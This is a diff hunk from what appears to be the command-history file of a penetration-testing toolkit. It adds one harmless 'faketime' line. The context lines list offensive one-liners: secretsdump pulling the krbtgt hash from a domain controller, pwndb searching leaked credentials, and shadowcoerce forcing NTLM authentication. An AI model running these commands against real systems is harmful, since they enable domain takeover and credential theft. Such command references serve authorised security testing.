@@ -326,4 +326,5 @@ KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -
 pwndb --target @example.com --output txt
 robotstester -u http://www.example.com/ -L
 shadowcoerce.py -d "domain" -u "user1" -p "complexpassword" 192.168.56.1 192.168.56.101
+faketime '2022-01-31 22:05:35' zsh
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
